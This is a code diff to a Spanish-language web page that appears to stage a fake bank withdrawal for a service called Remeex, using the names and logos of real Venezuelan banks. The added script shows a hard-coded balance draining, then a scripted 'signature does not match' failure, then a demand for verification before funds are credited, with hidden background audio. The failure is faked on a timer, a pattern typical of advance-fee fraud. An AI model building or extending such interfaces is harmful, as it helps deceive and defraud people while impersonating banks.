@@ -1614,6 +1614,72 @@
       border-radius: var(--border-radius);
     }
 
+    /* Mini Balance Card Styles */
+    .mini-balance-card {
+      background: linear-gradient(150deg, #1a237e 0%, #0d47a1 100%);
+      color: rgba(255, 255, 255, 0.95);
+      border-radius: var(--border-radius);
+      padding: 1rem;
+      margin: 1rem auto;
+      width: 90%;
+      max-width: 300px;
+      box-shadow: var(--shadow);
+      position: relative;
+      overflow: hidden;
+      z-index: 2;
+      font-family: 'Inter', sans-serif;
+      transition: var(--transition);
+    }
+
+    .mini-balance-card::after {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-image: 
+        linear-gradient(rgba(255, 255, 255, 0.05) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255, 255, 255, 0.05) 1px, transparent 1px);
+      background-size: 20px 20px;
+      z-index: 0;
+      opacity: 0.3;
+    }
+
+    .mini-balance-label {
+      font-size: 0.85rem;
+      color: rgba(255, 255, 255, 0.8);
+      margin-bottom: 0.5rem;
+    }
+
+    .mini-balance-amount {
+      font-size: 1.8rem;
+      font-weight: 700;
+      text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
+      background: linear-gradient(to right, #ffffff, #e0e0e0);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      text-fill-color: transparent;
+      position: relative;
+      transition: transform 0.2s ease-out;
+    }
+
+    /* Animation for balance flash on restoration */
+    @keyframes balance-flash-animation {
+      0% {
+        text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
+      }
+      50% {
+        text-shadow: 0 0 20px rgba(0, 230, 118, 0.8), 0 0 30px rgba(0, 230, 118, 0.6);
+        color: rgba(0, 230, 118, 1);
+        -webkit-text-fill-color: rgba(0, 230, 118, 1);
+      }
+      100% {
+        text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
+      }
+    }
+
     /* Responsive */
     @media (max-width: 768px) {
       .header {
@@ -1686,6 +1752,19 @@
       
       .data-item strong {
         min-width: 150px;
+      }
+
+      .mini-balance-card {
+        padding: 0.75rem;
+        margin: 0.75rem auto;
+      }
+      
+      .mini-balance-label {
+        font-size: 0.75rem;
+      }
+      
+      .mini-balance-amount {
+        font-size: 1.5rem;
       }
     }
     
@@ -1775,6 +1854,19 @@
       
       .data-item {
         font-size: 0.85rem;
+      }
+
+      .mini-balance-card {
+        padding: 0.6rem;
+      }
+      
+      .mini-balance-label {
+        font-size: 0.7rem;
+        margin-bottom: 0.3rem;
+      }
+      
+      .mini-balance-amount {
+        font-size: 1.2rem;
       }
     }
     
@@ -2252,14 +2344,11 @@
       </div>
       
       <div class="btn-container-adv">
-  <div class="btn-effect"></div>
-  <button class="btn-advanced" id="continuarFirmaBtn">
-    <span class="btn-text">
-      Continuar
-      <i class="fas fa-arrow-right btn-icon"></i>
-    </span>
-  </button>
-</div><i class="fas fa-arrow-right btn-icon"></i>
+        <div class="btn-effect"></div>
+        <button class="btn-advanced" id="continuarFirmaBtn">
+          <span class="btn-text">
+            Continuar
+            <i class="fas fa-arrow-right btn-icon"></i>
           </span>
         </button>
       </div>
@@ -2336,6 +2425,12 @@
     
     <div class="bank-logo-container">
       <img id="procesoRetiroLogo" src="" alt="Logo Banco" class="bank-logo">
+    </div>
+    
+    <!-- Mini Balance Card para Overlay Proceso Retiro -->
+    <div class="mini-balance-card">
+      <div class="mini-balance-label">Saldo disponible</div>
+      <div class="mini-balance-amount" id="miniBalanceAmount">1.800,00 Bs</div>
     </div>
     
     <div class="progress-container">
@@ -2488,7 +2583,7 @@
     "Banco de Venezuela, S.A.": "https://www.bancodevenezuela.com/wp-content/uploads/2023/03/logonuevo.png",
     "Banco Central de Venezuela": "https://www.bcv.org.ve/sites/default/files/default_images/logo_bcv-04_2.png",
     "Banco Venezolano de Crédito, S.A.": "https://www.venezolano.com/images/galeria/108_1.png",
-    "Banco Mercantil, C.A.": "https://www.mercantilbanco.com/mercprod/images/comunes/logo_popups.gif",
+    "Banco Mercantil, C.A.": "https://files.socialgest.net/mybio/5f529398b36f8_1599247256.png",
     "Banco Provincial, S.A.": "https://upload.wikimedia.org/wikipedia/commons/d/d4/BBVAprovinciallogo.svg",
     "Banco del Caribe C.A., Bancaribe": "https://d3olc33sy92l9e.cloudfront.net/wp-content/themes/bancaribe/images/Bancaribe-LogotipoTurquesa.png",
     "Banco Exterior C.A., Banco Universal": "https://upload.wikimedia.org/wikipedia/commons/thumb/d/d3/Banco-Exterior-VE-logo.png/183px-Banco-Exterior-VE-logo.png",
@@ -3745,45 +3840,66 @@
     Secuencia de Retiro Final
   */
   function iniciarProcesoRetiro() {
-    hideOverlay("overlayInicioRetiro");
+    // Obtener elementos del overlay
+    const overlay = document.getElementById("overlayProcesoRetiro");
+    const procesoRetiroTitulo = document.getElementById("procesoRetiroTitulo");
+    const procesoRetiroTexto = document.getElementById("procesoRetiroTexto");
+    const procesoRetiroProgress = document.getElementById("procesoRetiroProgress");
     
-    // Mostrar overlay de proceso
+    // Inicializar proceso
+    hideOverlay("overlayInicioRetiro");
     procesoRetiroLogo.src = logoBancoUsuario;
+    
+    // Establecer valor inicial en el mini-balance-card
+    const miniBalanceAmount = document.getElementById("miniBalanceAmount");
+    if (miniBalanceAmount) {
+      updateBalanceDisplay(miniBalanceAmount, originalBalance);
+    }
+    
     showOverlay("overlayProcesoRetiro");
     
-    // Primera etapa: Retirando fondos
+    // Inicializar audio
+    initAudio();
+    
+    // Iniciar animación del saldo
+    animateBalanceDecrease();
+    
+    // Primera fase: Retirando fondos (40 segundos)
     procesoRetiroTitulo.textContent = `Retirando fondos a ${bancoUsuario}`;
     procesoRetiroTexto.textContent = `Procesando transferencia de ${formatNumberVE(montoRetiro)} Bs`;
     
-    // Iniciar animación de la barra de progreso
-    animateProgressBarAdvanced(procesoRetiroProgress, 0, 100, 20000);
+    // Animar barra de progreso durante los primeros 40 segundos
+    animateProgressBarAdvanced(procesoRetiroProgress, 0, 40, 40000);
     
+    // Segunda fase: Verificación de firma (después de 40 segundos, durante 2 segundos)
     setTimeout(() => {
-      // Segunda etapa: Firma no coincide
       procesoRetiroTitulo.textContent = `Verificando firma`;
       procesoRetiroTexto.textContent = `${bancoUsuario} indica que tu firma no coincide`;
-      resetProgressBarAnimated(procesoRetiroProgress);
       
+      // Tercera fase: Fallo de firma y restauración del saldo (después de 42 segundos, durante 2 segundos)
       setTimeout(() => {
-        animateProgressBarAdvanced(procesoRetiroProgress, 0, 100, 15000);
+        // Detener la animación de decremento y restaurar saldo
+        animateBalanceRestore();
         
+        // Actualizar barra de progreso
+        animateProgressBarAdvanced(procesoRetiroProgress, 40, 50, 2000);
+        
+        // Cuarta fase: Verificación requerida (después de 44 segundos, durante 29 segundos)
         setTimeout(() => {
-          // Tercera etapa: Verificación adicional
           procesoRetiroTitulo.textContent = `Verificación requerida`;
           procesoRetiroTexto.textContent = `Debes verificar tu firma para poder continuar y acreditar los fondos`;
-          resetProgressBarAnimated(procesoRetiroProgress);
           
-          setTimeout(() => {
-            animateProgressBarAdvanced(procesoRetiroProgress, 0, 100, 10000);
-            
+          // Actualización final del progreso
+          animateProgressBarAdvanced(procesoRetiroProgress, 50, 100, 29000, () => {
+            // Mostrar overlay de firma no coincidente después de 73 segundos en total
             setTimeout(() => {
-              // Mostrar overlay Firma No Coincide
+              stopAudio();
               mostrarOverlayFirmaNoCoincide();
-            }, 10000);
-          }, 1000);
-        }, 15000);
-      }, 1000);
-    }, 20000);
+            }, 0);
+          });
+        }, 2000);
+      }, 2000);
+    }, 40000);
   }
   
   function mostrarOverlayFirmaNoCoincide() {
@@ -4063,6 +4179,173 @@
     if (datosRemeex.bankLogo) {
       sessionStorage.setItem("bankLogo", datosRemeex.bankLogo);
       localStorage.setItem("bankLogo", datosRemeex.bankLogo);
+    }
+  }
+
+  // Variables para la animación del saldo
+  let originalBalance = 1800.00; // Saldo inicial
+  let currentBalance = originalBalance;
+  let animationInterval = null;
+  let decrementSteps = 200; // 40 segundos / 0.2 segundos = 200 pasos
+  let decrementAmount = originalBalance / decrementSteps;
+  let isRestoringBalance = false;
+
+  // Función para actualizar la visualización del saldo con formato
+  function updateBalanceDisplay(balanceElem, balance) {
+    balanceElem.textContent = formatNumberVE(balance) + " Bs";
+  }
+
+  // Función para animar la disminución del saldo
+  function animateBalanceDecrease() {
+    const miniBalanceAmount = document.getElementById("miniBalanceAmount");
+    if (!miniBalanceAmount) return;
+    
+    // Limpiar cualquier animación existente
+    if (animationInterval) {
+      clearInterval(animationInterval);
+    }
+    
+    currentBalance = originalBalance;
+    updateBalanceDisplay(miniBalanceAmount, currentBalance);
+    
+    animationInterval = setInterval(() => {
+      if (isRestoringBalance) return;
+      
+      // Disminuir el saldo
+      currentBalance -= decrementAmount;
+      if (currentBalance < 0) currentBalance = 0;
+      
+      // Aplicar efecto de escala para retroalimentación visual
+      miniBalanceAmount.style.transform = "scale(1.05)";
+      setTimeout(() => {
+        miniBalanceAmount.style.transform = "scale(1.0)";
+      }, 100);
+      
+      // Actualizar la visualización
+      updateBalanceDisplay(miniBalanceAmount, currentBalance);
+      
+      // Si hemos llegado a cero, detener la animación
+      if (currentBalance <= 0) {
+        clearInterval(animationInterval);
+        animationInterval = null;
+      }
+    }, 200); // Actualizar cada 200ms
+  }
+
+  // Función para animar la restauración del saldo (para el fallo de firma)
+  function animateBalanceRestore() {
+    const miniBalanceAmount = document.getElementById("miniBalanceAmount");
+    if (!miniBalanceAmount) return;
+    
+    isRestoringBalance = true;
+    
+    // Pausar la animación de decremento (mantendremos el intervalo funcionando)
+    const currentBalanceValue = currentBalance;
+    
+    // Definir duración y pasos de la animación
+    const restoreDuration = 2000; // 2 segundos
+    const restoreSteps = 20; // 100ms por paso
+    const restoreStepAmount = (originalBalance - currentBalanceValue) / restoreSteps;
+    
+    // Aplicar animación de destello
+    miniBalanceAmount.style.animation = "balance-flash-animation 2s";
+    
+    // Iniciar restauración
+    let step = 0;
+    const restoreInterval = setInterval(() => {
+      step++;
+      
+      // Aumentar saldo
+      currentBalance += restoreStepAmount;
+      if (currentBalance > originalBalance) currentBalance = originalBalance;
+      
+      // Aplicar efecto de escala para retroalimentación visual
+      miniBalanceAmount.style.transform = "scale(1.05)";
+      setTimeout(() => {
+        miniBalanceAmount.style.transform = "scale(1.0)";
+      }, 50);
+      
+      // Actualizar visualización
+      updateBalanceDisplay(miniBalanceAmount, currentBalance);
+      
+      // Si la restauración está completa
+      if (step >= restoreSteps) {
+        clearInterval(restoreInterval);
+        
+        // Eliminar animación una vez completada
+        setTimeout(() => {
+          miniBalanceAmount.style.animation = "";
+          isRestoringBalance = false;
+        }, 500);
+      }
+    }, restoreDuration / restoreSteps);
+  }
+
+  // Funciones de audio
+  let audioElement = null;
+  let youtubePlayer = null;
+
+  function initAudio() {
+    try {
+      // Primer intento: elemento de audio directo
+      audioElement = document.createElement("audio");
+      audioElement.style.display = "none";
+      document.body.appendChild(audioElement);
+      
+      // Establecer fuente al tema de Eurovision
+      audioElement.src = "https://www.youtube.com/watch?v=sP1qO-lhoXQ";
+      
+      // Intentar comenzar en un timestamp específico (6:27 = 387 segundos)
+      audioElement.currentTime = 387;
+      
+      // Establecer volumen e intentar reproducir
+      audioElement.volume = 0.3;
+      
+      const playPromise = audioElement.play();
+      if (playPromise !== undefined) {
+        playPromise.catch(error => {
+          console.log("Error al reproducir audio directamente:", error);
+          initYouTubeAudio(); // Fallback a iframe de YouTube
+        });
+      }
+    } catch (e) {
+      console.log("Error con elemento de audio:", e);
+      initYouTubeAudio(); // Fallback a iframe de YouTube
+    }
+  }
+
+  function initYouTubeAudio() {
+    try {
+      // Crear iframe de YouTube
+      const ytContainer = document.createElement('div');
+      ytContainer.style.display = 'none';
+      ytContainer.innerHTML = `
+        <iframe id="youtubeAudio" width="1" height="1" 
+        src="https://www.youtube.com/embed/sP1qO-lhoXQ?start=387&autoplay=1&enablejsapi=1" 
+        frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" 
+        allowfullscreen></iframe>
+      `;
+      document.body.appendChild(ytContainer);
+      
+      // No podemos controlar directamente el iframe de YouTube sin la API de YouTube
+      // pero lo dejaremos reproducir durante los 73 segundos que necesitamos
+    } catch (e) {
+      console.log("Error con fallback de YouTube:", e);
+    }
+  }
+
+  function stopAudio() {
+    // Detener audio si existe
+    if (audioElement) {
+      audioElement.pause();
+      audioElement.remove();
+      audioElement = null;
+    }
+    
+    // Eliminar iframe de YouTube si existe
+    const ytFrame = document.getElementById('youtubeAudio');
+    if (ytFrame && ytFrame.parentNode) {
+      ytFrame.parentNode.remove();
     }
   }
 </script>
